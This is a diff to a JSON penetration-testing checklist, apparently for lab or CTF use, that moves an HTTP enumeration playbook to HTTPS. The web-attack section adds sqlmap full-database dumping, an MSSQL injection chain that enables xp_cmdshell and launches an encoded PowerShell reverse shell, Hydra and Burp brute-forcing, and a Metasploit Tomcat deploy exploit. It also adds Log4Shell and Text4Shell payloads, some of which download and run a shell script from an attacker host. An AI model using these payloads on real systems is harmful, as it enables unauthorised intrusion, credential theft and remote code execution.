@@ -1,17 +1,40 @@
 {
-  "service": "HTTP",
-  "port": 80,
+  "service": "HTTPS",
+  "port": 443,
   "categories": [
     {
-      "category": "1. Recon & Technology Fingerprinting",
+      "category": "1. TLS/Certificate Recon",
+      "tasks": [
+        {
+          "id": "https_cert_hostnames",
+          "title": "Extract Hostnames from the Certificate",
+          "description": "The certificate's CN and Subject Alternative Names frequently leak internal hostnames or subdomains worth adding to /etc/hosts and feeding into VHost fuzzing.",
+          "commands": [
+            "echo | openssl s_client -connect {target_ip}:443 2>/dev/null | openssl x509 -noout -text | grep -A1 'Subject Alternative Name'",
+            "echo | openssl s_client -connect {target_ip}:443 -servername {target_ip} 2>/dev/null | openssl x509 -noout -subject -issuer"
+          ]
+        },
+        {
+          "id": "https_sslscan_testssl",
+          "title": "Cipher & Protocol Enumeration",
+          "description": "Check for weak ciphers, deprecated TLS/SSL versions, and known vulnerabilities (Heartbleed, POODLE, etc.) — rarely the primary way in, but quick to run and occasionally flags something exploitable.",
+          "commands": [
+            "sslscan {target_ip}:443",
+            "testssl.sh {target_ip}:443"
+          ]
+        }
+      ]
+    },
+    {
+      "category": "2. Recon & Technology Fingerprinting",
       "tasks": [
         {
           "id": "http_fingerprint",
           "title": "cURL & WhatWeb",
           "description": "Inspect HTTP headers for server versions and use WhatWeb to fingerprint underlying CMS or frameworks.",
           "commands": [
-            "curl -I -v http://{target_ip}/",
-            "whatweb http://{target_ip}/"
+            "curl -Ik -v https://{target_ip}/",
+            "whatweb -a3 https://{target_ip}/ --no-errors"
           ]
         },
         {
@@ -19,21 +42,21 @@
           "title": "Nmap HTTP Scripts",
           "description": "Run default HTTP NSE scripts to check for obvious vulnerabilities or interesting endpoints.",
           "commands": [
-            "sudo nmap --script http-* {target_ip}"
+            "sudo nmap --script http-*,ssl-cert,ssl-enum-ciphers -p 443 {target_ip}"
           ]
         }
       ]
     },
     {
-      "category": "2. Directory & File Fuzzing",
+      "category": "3. Directory & File Fuzzing",
       "tasks": [
         {
           "id": "http_feroxbuster",
           "title": "Feroxbuster (Recursive)",
           "description": "Aggressive, recursive directory discovery filtering specific status codes.",
           "commands": [
-            "feroxbuster -r -s 200,204,206,301,302,401,403 --url http://{target_ip}/ --scan-dir-listings -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
-            "feroxbuster --url http://{target_ip}/ -r -w -E /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
+            "feroxbuster -k -r -s 200,204,206,301,302,401,403 --url https://{target_ip}/ --scan-dir-listings -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
+            "feroxbuster -k --url https://{target_ip}/ -r -w -E /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
           ]
         },
         {
@@ -41,20 +64,28 @@
           "title": "Gobuster (Extensions)",
           "description": "Targeted directory brute-forcing looking for specific file extensions.",
           "commands": [
-            "gobuster dir -u http://{target_ip}/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x .php,.html,.txt"
+            "gobuster dir -k -u https://{target_ip}/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x .php,.html,.txt"
           ]
         }
       ]
     },
     {
-      "category": "3. VHost & Visual Recon",
+      "category": "4. VHost & Visual Recon",
       "tasks": [
         {
           "id": "http_ffuf_vhost",
           "title": "Ffuf (VHost Fuzzing)",
-          "description": "Fuzz the Host header to find hidden virtual hosts. Replace the -fs flag value with the default response size.",
+          "description": "Fuzz the Host header to find hidden virtual hosts. Be sure to replace the -fs (filter size) flag value with the default response size.",
           "commands": [
-            "ffuf -u http://{target_ip} -H \"Host: FUZZ.target.local\" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131"
+            "ffuf -u https://{target_ip} -H \"Host: FUZZ.target.local\" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 1131"
+          ]
+        },
+        {
+          "id": "http_gobuster_vhost",
+          "title": "Gobuster (VHost)",
+          "description": "Alternative VHost enumeration tool.",
+          "commands": [
+            "gobuster vhost -k -u https://{target_ip} -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt"
           ]
         },
         {
@@ -68,7 +99,7 @@
         {
           "id": "http_gowitness",
           "title": "Gowitness (Visual Recon)",
-          "description": "Take full-page screenshots of a large list of discovered URLs and view them in a local web interface.",
+          "description": "If you have a large list of discovered URLs, use gowitness to screenshot all of them and view them in a local web interface.",
           "commands": [
             "gowitness scan file -f urllist.txt --screenshot-fullpage --timeout 15 --write-db",
             "gowitness report server"
@@ -77,7 +108,7 @@
       ]
     },
     {
-      "category": "4. Web Application Attacks",
+      "category": "5. Web Application Attacks",
       "tasks": [
         {
           "id": "http_sqli_basic",
@@ -89,21 +120,70 @@
           ]
         },
         {
+          "id": "http_sqlmap",
+          "title": "SQLMap Automated Exploitation",
+          "description": "Automate injection point discovery and dumping once manual probing confirms a vulnerable form or parameter.",
+          "commands": [
+            "sqlmap -u https://{target_ip}/login.aspx --forms --crawl=2 --batch --dump-all",
+            "sqlmap -u 'https://{target_ip}/page.php?id=1' --dbs --batch",
+            "sqlmap -u 'https://{target_ip}/page.php?id=1' -D <database> -T <table> --dump"
+          ]
+        },
+        {
+          "id": "http_sqli_mssql_xp_cmdshell",
+          "title": "Blind SQLi to RCE (MSSQL xp_cmdshell Chain)",
+          "description": "When a login form is vulnerable to blind/time-based SQLi against an MSSQL backend (confirmed with WAITFOR DELAY), stack queries to enable and call xp_cmdshell for command execution. Base64-encode a PowerShell reverse shell for the final payload since quoting inside the injected string is limited.",
+          "commands": [
+            "'; WAITFOR DELAY '0:0:5'-- //",
+            "'; EXECUTE sp_configure 'show advanced options', 1;--",
+            "'; RECONFIGURE;--",
+            "'; EXECUTE sp_configure 'xp_cmdshell', 1;--",
+            "'; RECONFIGURE;--",
+            "'; EXECUTE xp_cmdshell 'whoami';--",
+            "'; EXECUTE xp_cmdshell 'powershell -nop -w hidden -e <base64_reverse_shell>';--"
+          ]
+        },
+        {
           "id": "http_git_dumper",
           "title": "Exposed .git Extraction",
-          "description": "If /.git is accessible, dump the repository locally and scan it for hardcoded secrets.",
+          "description": "If /.git is accessible, dump the repository locally and scan it for hardcoded secrets. gitleaks/git log -S won't catch everything, so also walk the full commit history manually — secrets are often removed in a later 'cleanup'/'security update' commit but still sit in an earlier one's diff.",
           "commands": [
-            "git-dumper http://{target_ip}/.git ./git-repo",
+            "python3 -m venv git-env && source git-env/bin/activate && pip install git-dumper",
+            "git-dumper https://{target_ip}/.git ./git-repo",
             "cd git-repo && git log -S'http'",
-            "cd git-repo && gitleaks detect"
+            "cd git-repo && gitleaks detect",
+            "cd git-repo && git log --all --oneline",
+            "cd git-repo && git show <commit_hash>"
           ]
         },
         {
           "id": "http_hydra_form",
           "title": "Hydra Form Brute-Forcing",
-          "description": "Brute-force an HTTP POST login form. Adjust the URI path, variables, and failure string.",
+          "description": "Brute-force an HTTP POST login form. Adjust the URI path, username/password variables, and failure message string. Use the https-post-form service name instead of http-post-form.",
           "commands": [
-            "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target_ip} http-post-form \"/login.php:username=^USER^&password=^PASS^:Data error\""
+            "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target_ip} https-post-form \"/login.php:username=^USER^&password=^PASS^:Data error\""
+          ]
+        },
+        {
+          "id": "http_basic_auth_brute",
+          "title": "HTTP Basic Auth Brute-Forcing",
+          "description": "Distinct from a POST login form — a 401 response with a WWW-Authenticate header means credentials go in the request itself, not a form body. Check quickly with curl before scripting a brute-force.",
+          "commands": [
+            "curl -Ik https://{target_ip}/",
+            "curl -k -u admin:admin https://{target_ip}/",
+            "nmap --script http-brute -p 443 {target_ip}",
+            "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {target_ip} https-get /"
+          ]
+        },
+        {
+          "id": "http_burp_intruder",
+          "title": "Burp Intruder Form Brute-Forcing",
+          "description": "Use when Hydra can't handle the form (CSRF token per request, session cookie required, non-standard failure condition). Capture the login request in Burp, send to Intruder, mark the password field as the payload position, and use 'Grep - Match' on the failure string to spot the one response that differs.",
+          "commands": [
+            "# Proxy the login POST through Burp, send to Intruder (Ctrl+I)",
+            "# Attack type: Sniper, payload position on the password parameter only",
+            "# Payloads tab: load users.txt or rockyou.txt as the payload list",
+            "# Options tab: Grep - Match on the known failure string (e.g. 'Data error') to filter successes"
           ]
         },
         {
@@ -111,8 +191,26 @@
           "title": "Tomcat / JBoss Enumeration",
           "description": "Scan and exploit default credentials on Tomcat or JBoss managers.",
           "commands": [
-            "msfconsole -x \"use auxiliary/scanner/http/tomcat_enum; set RHOSTS {target_ip}; run\"",
-            "msfconsole -x \"use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS {target_ip}; run\""
+            "msfconsole -x \"use auxiliary/scanner/http/tomcat_enum; set RHOSTS {target_ip}; set RPORT 443; set SSL true; run\"",
+            "msfconsole -x \"use exploit/multi/http/tomcat_mgr_deploy; set RHOSTS {target_ip}; set RPORT 443; set SSL true; run\""
+          ]
+        },
+        {
+          "id": "http_log4shell",
+          "title": "Log4Shell Probing",
+          "description": "Test input fields or headers for Log4j vulnerability.",
+          "commands": [
+            "${jndi:ldap://<Kali_IP>:<Port>/o=reference}"
+          ]
+        },
+        {
+          "id": "http_text4shell",
+          "title": "Text4Shell (CVE-2022-42889) Probing",
+          "description": "Apache Commons Text <=1.9 evaluates string interpolation prefixes like 'script:' by default. Test any field that might be passed through StringSubstitutor, then chain to a download-and-execute RCE.",
+          "commands": [
+            "${script:javascript:java.lang.Runtime.getRuntime().exec('id')}",
+            "${script:javascript:java.lang.Runtime.getRuntime().exec('wget http://<Kali_IP>/shell.sh -O /tmp/shell.sh')}",
+            "${script:javascript:java.lang.Runtime.getRuntime().exec('bash /tmp/shell.sh')}"
           ]
         }
       ]
